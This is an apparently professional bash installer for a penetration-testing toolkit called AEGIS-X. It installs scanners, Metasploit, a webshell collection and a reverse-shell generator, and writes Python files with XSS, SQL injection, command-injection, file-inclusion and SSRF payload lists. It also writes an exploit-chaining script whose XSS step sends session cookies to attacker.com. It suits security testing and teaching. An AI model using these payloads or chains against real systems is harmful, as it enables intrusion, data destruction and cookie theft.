#!/bin/bash

# AEGIS-X Professional Tool Installation Script
# Installs security tools on-demand based on target type and hunting requirements
# Updated for Ubuntu 24.04 (Noble) compatibility

set -e

TOOLS_DIR="/opt/aegis-tools"
LOG_FILE="/var/log/aegis-tool-install.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log() {
    echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
}

warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$LOG_FILE"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$LOG_FILE"
}

# Detect Ubuntu version for compatibility
detect_ubuntu_version() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        UBUNTU_VERSION=$VERSION_ID
        UBUNTU_CODENAME=$VERSION_CODENAME
        log "Detected Ubuntu $UBUNTU_VERSION ($UBUNTU_CODENAME)"
    else
        warn "Could not detect Ubuntu version, assuming latest"
        UBUNTU_VERSION="24.04"
        UBUNTU_CODENAME="noble"
    fi
}

# Install system dependencies with Ubuntu 24.04 compatibility
install_system_dependencies() {
    log "Installing system dependencies for Ubuntu $UBUNTU_VERSION..."
    
    sudo apt-get update
    
    # Base packages that work across versions
    sudo apt-get install -y \
        build-essential \
        curl \
        wget \
        git \
        unzip \
        software-properties-common \
        apt-transport-https \
        ca-certificates \
        gnupg \
        lsb-release
    
    # Version-specific packages
    if [[ "$UBUNTU_VERSION" == "24.04" || "$UBUNTU_CODENAME" == "noble" ]]; then
        log "Installing Ubuntu 24.04 specific packages..."
        sudo apt-get install -y \
            libgl1-mesa-dri \
            libasound2t64 \
            libglib2.0-0 \
            libsm6 \
            libxext6 \
            libxrender-dev \
            libgomp1 \
            libxss1 \
            libappindicator3-1 \
            libatk-bridge2.0-0 \
            libdrm2 \
            libxcomposite1 \
            libxdamage1 \
            libxrandr2 \
            libgbm1 \
            libxkbcommon0 \
            libgtk-3-0
    else
        log "Installing packages for older Ubuntu versions..."
        sudo apt-get install -y \
            libgl1-mesa-glx \
            libasound2 \
            libgconf-2-4 \
            libglib2.0-0 \
            libsm6 \
            libxext6 \
            libxrender-dev \
            libgomp1 \
            libxss1 \
            libappindicator3-1 \
            libatk-bridge2.0-0 \
            libdrm2 \
            libxcomposite1 \
            libxdamage1 \
            libxrandr2 \
            libgbm1 \
            libxkbcommon0 \
            libgtk-3-0
    fi
}

# Create tools directory
sudo mkdir -p "$TOOLS_DIR"
sudo chown -R $(whoami):$(whoami) "$TOOLS_DIR"

# Detect Ubuntu version
detect_ubuntu_version

# Install system dependencies
install_system_dependencies

install_web_tools() {
    log "Installing web application security tools..."
    
    # Core web scanners
    # Web vulnerability scanners (nuclei is installed via Go, not Python)
    pip3 install wapiti3 sqlmap xsstrike commix
    
    # Install SSRFmap from GitHub (not available on PyPI)
    git clone https://github.com/swisskyrepo/SSRFmap.git /tmp/ssrfmap
    cd /tmp/ssrfmap && pip3 install -r requirements.txt
    sudo cp ssrfmap.py /usr/local/bin/ssrfmap
    sudo chmod +x /usr/local/bin/ssrfmap
    cd - && rm -rf /tmp/ssrfmap
    
    # Directory/file fuzzers
    go install github.com/ffuf/ffuf/v2@latest
    go install github.com/OJ/gobuster/v3@latest
    pip3 install dirsearch
    
    # Subdomain enumeration
    go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
    go install github.com/owasp-amass/amass/v3/...@latest
    pip3 install sublist3r
    
    # HTTP tools
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest
    pip3 install requests beautifulsoup4 selenium
    
    # Burp Suite Community (if not installed)
    if ! command -v burpsuite &> /dev/null; then
        warn "Burp Suite not found. Please install manually from PortSwigger website."
    fi
    
    # CORS and GraphQL security tools
    # Install Corsy from GitHub (not available on PyPI)
    git clone https://github.com/s0md3v/Corsy.git /tmp/corsy
    cd /tmp/corsy && pip3 install -r requirements.txt
    sudo cp corsy.py /usr/local/bin/corsy
    sudo chmod +x /usr/local/bin/corsy
    cd - && rm -rf /tmp/corsy
    
    # Install GraphQL-Cop from GitHub (not available on PyPI)
    git clone https://github.com/dolevf/graphql-cop.git /tmp/graphql-cop
    cd /tmp/graphql-cop && pip3 install -r requirements.txt
    sudo cp graphql-cop.py /usr/local/bin/graphql-cop
    sudo chmod +x /usr/local/bin/graphql-cop
    cd - && rm -rf /tmp/graphql-cop
    
    # Custom web exploitation tools
    pip3 install paramiko pycryptodome jwt
}

install_mobile_tools() {
    log "Installing mobile application security tools..."
    
    # APK analysis tools
    sudo apt-get update
    sudo apt-get install -y apktool jadx dex2jar
    
    # Mobile security frameworks
    pip3 install mobsf-cli
    
    # Frida for dynamic analysis
    pip3 install frida-tools objection
    
    # Android debugging
    sudo apt-get install -y android-tools-adb android-tools-fastboot
}

install_network_tools() {
    log "Installing network security tools..."
    
    # Install development headers required for Go network tools
    log "Installing development packages for network tools..."
    sudo apt-get install -y \
        libpcap-dev \
        libpcap0.8-dev \
        build-essential \
        gcc \
        libc6-dev
    
    # Port scanners
    sudo apt-get install -y nmap masscan
    go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
    
    # Service enumeration
    sudo apt-get install -y nikto sslscan testssl.sh
    pip3 install sslyze
    
    # Network analysis
    sudo apt-get install -y wireshark-common tcpdump
    pip3 install scapy
}

install_code_analysis_tools() {
    log "Installing code analysis tools..."
    
    # Static analysis
    pip3 install semgrep bandit safety
    
    # Secret scanning
    go install github.com/trufflesecurity/trufflehog/v3@latest
    pip3 install detect-secrets
    go install github.com/zricethezav/gitleaks/v8@latest
    
    # Dependency analysis
    pip3 install pip-audit
    npm install -g audit-ci
}

install_osint_tools() {
    log "Installing OSINT and reconnaissance tools..."
    
    # DNS tools
    sudo apt-get install -y dnsutils dig
    pip3 install dnspython
    
    # Certificate transparency
    git clone https://github.com/UnaPibaGeek/ctfr.git /tmp/ctfr
    cd /tmp/ctfr && pip3 install -r requirements.txt
    sudo cp ctfr.py /usr/local/bin/ctfr
    sudo chmod +x /usr/local/bin/ctfr
    cd - && rm -rf /tmp/ctfr
    
    # Wayback machine
    pip3 install waybackpy
    
    # Social media OSINT
    pip3 install twint instaloader
    
    # Shodan/Censys
    pip3 install shodan censys
}

install_exploitation_tools() {
    log "Installing exploitation and payload tools..."
    
    # Metasploit (if not installed)
    if ! command -v msfconsole &> /dev/null; then
        warn "Metasploit not found. Installing..."
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
        chmod 755 msfinstall
        ./msfinstall
    fi
    
    # Custom payload generators
    pip3 install pycrypto pwntools
    
    # Web shells and backdoors
    git clone https://github.com/tennc/webshell.git "$TOOLS_DIR/webshells" || true
    
    # Reverse shell generators
    # Install reverse shell generator from GitHub (not available on PyPI)
    git clone https://github.com/0dayCTF/reverse-shell-generator.git /tmp/reverse-shell-generator
    cd /tmp/reverse-shell-generator && pip3 install -r requirements.txt
    sudo cp revshell.py /usr/local/bin/revshell
    sudo chmod +x /usr/local/bin/revshell
    cd - && rm -rf /tmp/reverse-shell-generator
}

install_ai_ml_tools() {
    log "Installing AI/ML tools for advanced analysis..."
    
    # Machine learning libraries
    pip3 install scikit-learn tensorflow torch transformers
    
    # NLP for vulnerability analysis
    pip3 install spacy nltk
    python3 -m spacy download en_core_web_sm
    
    # Computer vision for screenshot analysis
    pip3 install opencv-python pillow
}

install_chrome_and_chromedriver() {
    log "Installing Google Chrome and ChromeDriver..."
    
    # Install Google Chrome
    if ! command -v google-chrome &> /dev/null; then
        log "Installing Google Chrome..."
        wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
        echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list
        sudo apt-get update
        sudo apt-get install -y google-chrome-stable
    else
        log "Google Chrome already installed"
    fi
    
    # Install ChromeDriver with proper version matching
    if ! command -v chromedriver &> /dev/null; then
        log "Installing ChromeDriver..."
        
        # Get Chrome version
        CHROME_VERSION=$(google-chrome --version | cut -d " " -f3)
        log "Chrome version: $CHROME_VERSION"
        
        # For Chrome 115+, use Chrome for Testing API
        MAJOR_VERSION=$(echo $CHROME_VERSION | cut -d "." -f1)
        
        if [ "$MAJOR_VERSION" -ge 115 ]; then
            log "Using Chrome for Testing API for Chrome $MAJOR_VERSION+"
            # Get the latest ChromeDriver version for this Chrome version
            CHROMEDRIVER_VERSION=$(curl -s "https://googlechromelabs.github.io/chrome-for-testing/LATEST_RELEASE_$MAJOR_VERSION")
            if [ -z "$CHROMEDRIVER_VERSION" ]; then
                # Fallback to stable version
                CHROMEDRIVER_VERSION=$(curl -s "https://googlechromelabs.github.io/chrome-for-testing/LATEST_RELEASE_STABLE")
            fi
            log "ChromeDriver version: $CHROMEDRIVER_VERSION"
            
            # Download ChromeDriver from Chrome for Testing
            wget -O /tmp/chromedriver.zip "https://storage.googleapis.com/chrome-for-testing-public/${CHROMEDRIVER_VERSION}/linux64/chromedriver-linux64.zip"
            sudo unzip /tmp/chromedriver.zip -d /tmp/
            sudo mv /tmp/chromedriver-linux64/chromedriver /usr/local/bin/
            sudo chmod +x /usr/local/bin/chromedriver
            rm -rf /tmp/chromedriver.zip /tmp/chromedriver-linux64
        else
            log "Using legacy ChromeDriver API for Chrome $MAJOR_VERSION"
            # For older Chrome versions, use the legacy method
            CHROME_VERSION_SHORT=$(echo $CHROME_VERSION | cut -d "." -f1-3)
            CHROMEDRIVER_VERSION=$(curl -s "https://chromedriver.storage.googleapis.com/LATEST_RELEASE_${CHROME_VERSION_SHORT}")
            wget -O /tmp/chromedriver.zip "https://chromedriver.storage.googleapis.com/${CHROMEDRIVER_VERSION}/chromedriver_linux64.zip"
            sudo unzip /tmp/chromedriver.zip -d /usr/local/bin/
            sudo chmod +x /usr/local/bin/chromedriver
            rm -f /tmp/chromedriver.zip
        fi
        
        # Verify installation
        chromedriver --version
        log "ChromeDriver installed successfully"
    else
        log "ChromeDriver already installed"
    fi
}

install_reporting_tools() {
    log "Installing reporting and documentation tools..."
    
    # Install Chrome and ChromeDriver first
    install_chrome_and_chromedriver
    
    # Report generation
    pip3 install reportlab markdown2 jinja2
    
    # Screenshot tools
    sudo apt-get install -y scrot imagemagick
    pip3 install playwright
    playwright install
    
    # Video recording
    sudo apt-get install -y ffmpeg
}

install_steganography_tools() {
    log "Installing steganography and forensics tools..."
    
    # File analysis
    sudo apt-get install -y binwalk foremost exiftool
    pip3 install stegano
    
    # Hash analysis
    sudo apt-get install -y hashcat john
}

install_cloud_tools() {
    log "Installing cloud security tools..."
    
    # AWS tools
    pip3 install awscli boto3 pacu
    
    # Azure tools
    pip3 install azure-cli
    
    # GCP tools
    curl https://sdk.cloud.google.com | bash
    
    # Multi-cloud
    pip3 install cloudsplaining
}

install_custom_aegis_tools() {
    log "Installing custom AEGIS-X tools..."
    
    # Custom vulnerability scanners
    mkdir -p "$TOOLS_DIR/custom"
    
    # Advanced payload generators
    cat > "$TOOLS_DIR/custom/payload_generator.py" << 'EOF'
#!/usr/bin/env python3
"""
AEGIS-X Advanced Payload Generator
Generates sophisticated payloads for various vulnerability types
"""

import base64
import urllib.parse
import random
import string

class AdvancedPayloadGenerator:
    def __init__(self):
        self.payloads = {
            'xss': self._generate_xss_payloads(),
            'sqli': self._generate_sqli_payloads(),
            'rce': self._generate_rce_payloads(),
            'lfi': self._generate_lfi_payloads(),
            'ssrf': self._generate_ssrf_payloads()
        }
    
    def _generate_xss_payloads(self):
        return [
            "<script>alert('AEGIS-X-XSS')</script>",
            "<img src=x onerror=alert('AEGIS-X-XSS')>",
            "javascript:alert('AEGIS-X-XSS')",
            "<svg onload=alert('AEGIS-X-XSS')>",
            "'-alert('AEGIS-X-XSS')-'",
            "\"><script>alert('AEGIS-X-XSS')</script>",
            "<iframe src=javascript:alert('AEGIS-X-XSS')>",
            "<body onload=alert('AEGIS-X-XSS')>",
            "<details open ontoggle=alert('AEGIS-X-XSS')>",
            "<marquee onstart=alert('AEGIS-X-XSS')>"
        ]
    
    def _generate_sqli_payloads(self):
        return [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "1' ORDER BY 1--+",
            "1' UNION SELECT 1,2,3,4,5--+",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' UNION SELECT user(),database(),version()--"
        ]
    
    def _generate_rce_payloads(self):
        return [
            "; id",
            "| id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| whoami",
            "&& uname -a",
            "`cat /etc/hosts`",
            "$(cat /proc/version)"
        ]
    
    def _generate_lfi_payloads(self):
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "/proc/self/environ",
            "/var/log/apache2/access.log"
        ]
    
    def _generate_ssrf_payloads(self):
        return [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            "http://[::1]:80",
            "http://0.0.0.0:80",
            "http://2130706433:80",
            "http://017700000001:80"
        ]
    
    def generate_payload(self, vuln_type, encoding=None):
        if vuln_type not in self.payloads:
            return None
        
        payload = random.choice(self.payloads[vuln_type])
        
        if encoding == 'url':
            payload = urllib.parse.quote(payload)
        elif encoding == 'base64':
            payload = base64.b64encode(payload.encode()).decode()
        elif encoding == 'html':
            payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        
        return payload

if __name__ == "__main__":
    generator = AdvancedPayloadGenerator()
    print("AEGIS-X Advanced Payload Generator")
    print("Available types: xss, sqli, rce, lfi, ssrf")
    
    vuln_type = input("Enter vulnerability type: ")
    encoding = input("Enter encoding (url/base64/html/none): ")
    
    if encoding == 'none':
        encoding = None
    
    payload = generator.generate_payload(vuln_type, encoding)
    if payload:
        print(f"Generated payload: {payload}")
    else:
        print("Invalid vulnerability type")
EOF
    
    chmod +x "$TOOLS_DIR/custom/payload_generator.py"
    
    # Advanced exploitation framework
    cat > "$TOOLS_DIR/custom/exploit_chainer.py" << 'EOF'
#!/usr/bin/env python3
"""
AEGIS-X Exploit Chain Generator
Chains multiple vulnerabilities for maximum impact
"""

import json
import itertools
from typing import List, Dict, Any

class ExploitChainer:
    def __init__(self):
        self.vulnerability_chains = {
            'privilege_escalation': [
                ['lfi', 'log_poisoning', 'rce'],
                ['sqli', 'file_write', 'webshell'],
                ['xss', 'csrf', 'admin_takeover'],
                ['ssrf', 'internal_service', 'rce']
            ],
            'data_exfiltration': [
                ['sqli', 'database_dump'],
                ['lfi', 'config_files', 'credentials'],
                ['directory_traversal', 'sensitive_files'],
                ['xxe', 'file_disclosure']
            ],
            'lateral_movement': [
                ['rce', 'credential_harvesting', 'ssh_access'],
                ['file_upload', 'webshell', 'system_access'],
                ['deserialization', 'code_execution', 'persistence']
            ]
        }
    
    def generate_chains(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Generate exploitation chains from discovered vulnerabilities"""
        chains = []
        
        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        # Generate chains based on available vulnerabilities
        for chain_type, chain_patterns in self.vulnerability_chains.items():
            for pattern in chain_patterns:
                if all(vuln_type in vuln_by_type for vuln_type in pattern):
                    chain = {
                        'type': chain_type,
                        'pattern': pattern,
                        'vulnerabilities': [vuln_by_type[vtype][0] for vtype in pattern],
                        'impact': self._calculate_chain_impact(pattern),
                        'complexity': len(pattern),
                        'steps': self._generate_exploitation_steps(pattern)
                    }
                    chains.append(chain)
        
        return sorted(chains, key=lambda x: x['impact'], reverse=True)
    
    def _calculate_chain_impact(self, pattern: List[str]) -> int:
        """Calculate the impact score of an exploitation chain"""
        impact_scores = {
            'rce': 10,
            'sqli': 8,
            'lfi': 7,
            'xss': 6,
            'ssrf': 7,
            'file_upload': 9,
            'deserialization': 9,
            'xxe': 7,
            'csrf': 5,
            'directory_traversal': 6
        }
        
        total_impact = sum(impact_scores.get(vuln, 3) for vuln in pattern)
        # Bonus for chain length (more complex chains are more valuable)
        chain_bonus = len(pattern) * 2
        
        return total_impact + chain_bonus
    
    def _generate_exploitation_steps(self, pattern: List[str]) -> List[Dict[str, str]]:
        """Generate detailed exploitation steps for a chain"""
        step_templates = {
            'lfi': {
                'description': 'Exploit Local File Inclusion to read sensitive files',
                'payload': '../../../etc/passwd',
                'expected_result': 'System user information disclosed'
            },
            'sqli': {
                'description': 'Exploit SQL Injection to extract database information',
                'payload': "' UNION SELECT user(),database(),version()--",
                'expected_result': 'Database credentials and structure revealed'
            },
            'rce': {
                'description': 'Execute remote commands on the target system',
                'payload': '; id; uname -a',
                'expected_result': 'System information and user context obtained'
            },
            'xss': {
                'description': 'Execute malicious JavaScript in victim browser',
                'payload': "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
                'expected_result': 'Session cookies stolen'
            },
            'ssrf': {
                'description': 'Access internal services via Server-Side Request Forgery',
                'payload': 'http://127.0.0.1:8080/admin',
                'expected_result': 'Internal admin interface accessed'
            }
        }
        
        steps = []
        for i, vuln_type in enumerate(pattern, 1):
            template = step_templates.get(vuln_type, {
                'description': f'Exploit {vuln_type} vulnerability',
                'payload': 'Custom payload required',
                'expected_result': 'Vulnerability exploited successfully'
            })
            
            step = {
                'step': i,
                'vulnerability': vuln_type,
                'description': template['description'],
                'payload': template['payload'],
                'expected_result': template['expected_result']
            }
            steps.append(step)
        
        return steps

if __name__ == "__main__":
    chainer = ExploitChainer()
    
    # Example vulnerabilities
    sample_vulns = [
        {'type': 'lfi', 'severity': 'high', 'url': '/page.php?file='},
        {'type': 'rce', 'severity': 'critical', 'url': '/exec.php?cmd='},
        {'type': 'sqli', 'severity': 'high', 'url': '/login.php?id='}
    ]
    
    chains = chainer.generate_chains(sample_vulns)
    
    print("Generated Exploitation Chains:")
    for chain in chains:
        print(f"\nChain Type: {chain['type']}")
        print(f"Impact Score: {chain['impact']}")
        print(f"Complexity: {chain['complexity']}")
        print("Steps:")
        for step in chain['steps']:
            print(f"  {step['step']}. {step['description']}")
            print(f"     Payload: {step['payload']}")
            print(f"     Expected: {step['expected_result']}")
EOF
    
    chmod +x "$TOOLS_DIR/custom/exploit_chainer.py"
}

# Main installation function
main() {
    log "Starting AEGIS-X Professional Tool Installation"
    
    # Update system
    sudo apt-get update
    
    # Install based on target type
    case "${1:-all}" in
        "web")
            install_web_tools
            ;;
        "mobile")
            install_mobile_tools
            ;;
        "network")
            install_network_tools
            ;;
        "code")
            install_code_analysis_tools
            ;;
        "osint")
            install_osint_tools
            ;;
        "exploit")
            install_exploitation_tools
            ;;
        "ai")
            install_ai_ml_tools
            ;;
        "reporting")
            install_reporting_tools
            ;;
        "steganography")
            install_steganography_tools
            ;;
        "cloud")
            install_cloud_tools
            ;;
        "custom")
            install_custom_aegis_tools
            ;;
        "all")
            install_web_tools
            install_mobile_tools
            install_network_tools
            install_code_analysis_tools
            install_osint_tools
            install_exploitation_tools
            install_ai_ml_tools
            install_reporting_tools
            install_steganography_tools
            install_cloud_tools
            install_custom_aegis_tools
            ;;
        *)
            error "Unknown target type: $1"
            echo "Usage: $0 [web|mobile|network|code|osint|exploit|ai|reporting|steganography|cloud|custom|all]"
            exit 1
            ;;
    esac
    
    log "Tool installation completed successfully!"
    log "Tools installed in: $TOOLS_DIR"
    log "Installation log: $LOG_FILE"
}

# Run main function with all arguments
main "$@"